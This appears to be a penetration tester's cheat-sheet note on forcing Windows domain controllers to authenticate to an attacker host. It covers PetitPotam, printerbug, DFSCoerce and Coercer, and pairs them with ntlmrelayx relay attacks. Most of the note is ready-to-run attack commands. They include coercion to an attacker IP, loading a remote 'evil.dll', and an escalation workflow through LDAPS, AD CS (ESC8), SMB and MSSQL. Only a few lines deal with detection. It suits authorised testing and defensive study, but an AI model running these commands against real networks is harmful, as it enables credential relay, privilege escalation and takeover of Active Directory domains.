---
tags: [pentest, coercion, petitpotam, coercer, ad, active-directory, initial-access, windows]
phase: 5
---
# Coercion - PetitPotam / Coercer / DFSCoerce

Force a Windows host (often a DC) to authenticate to an attacker-controlled IP. Pair with [[12 - ntlmrelayx]] for relay attacks.

[[06 - Gaining Access/00 - README|Folder index]]

## PetitPotam (MS-EFSRPC)

```bash
# Older syntax
python3 PetitPotam.py 10.10.14.5 <target-ip>

# With creds (works after patch on some configs)
python3 PetitPotam.py -u user -p pass -d corp.local 10.10.14.5 <target-ip>
```

## PrintNightmare-style (MS-RPRN spooler)

```bash
impacket-PrintNightmare corp.local/user:'pass'@<target>.corp.local '\\10.10.14.5\share\evil.dll'
# Or:
python3 printerbug.py corp.local/user:'pass'@<target> 10.10.14.5
```

## DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u user -p pass -d corp.local 10.10.14.5 <target>
```

## Coercer - one tool that does them all

```bash
# Discover which coercion vectors work
Coercer.py scan -u user -p pass -d corp.local -t <target>

# Coerce via the best vector
Coercer.py coerce -u user -p pass -d corp.local -l 10.10.14.5 -t <target>

# Authenticated only - some need a cred, some don't
Coercer.py fuzz -u user -p pass -d corp.local -t <target>
```

## Workflow

```text
1. Start ntlmrelayx listener targeting the relay destination
   impacket-ntlmrelayx -t ldaps://dc01.corp.local --escalate-user attacker -smb2support

2. Run a coercion tool from another terminal
   Coercer.py coerce -u user -p pass -d corp.local -l 10.10.14.5 -t dc01.corp.local

3. Coerced host (dc01) authenticates to 10.10.14.5 (you)
4. ntlmrelayx forwards that auth to LDAPS on dc01 → escalates `attacker`
5. Profit
```

## Common relay destinations after coercion

| Target | Result |
| --- | --- |
| `ldaps://<dc>` w/ `--escalate-user` | Add user to high-priv group |
| `http://<ca>/certsrv/certfnsh.asp --adcs` | Get a cert for the coerced host (ESC8) |
| `smb://<host>` | RCE / SAM dump if SMB signing off |
| `mssql://<host>` | xp_cmdshell as the coerced user |

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `RPC_S_ACCESS_DENIED` | Coercion vector patched. Try another (Coercer.py fuzz). |
| Target auths but relay fails | Check SMB / LDAP signing on relay destination. |
| Auth comes from wrong user | Some coercion vectors use machine account, others user. Match relay accordingly. |
| Spooler service stopped | Try DFSCoerce or PetitPotam instead. |

## Detection

- Unusual MS-EFSRPC / MS-DFSNM / MS-RPRN RPC calls from non-admin sources.
- DC authenticating outbound to non-DC IPs is anomalous.
- Microsoft Defender for Identity has built-in coercion detections.

> [!tip] When in doubt, Coercer
> `Coercer.py fuzz` will try every known coercion vector and report which work. Saves the trial-and-error.
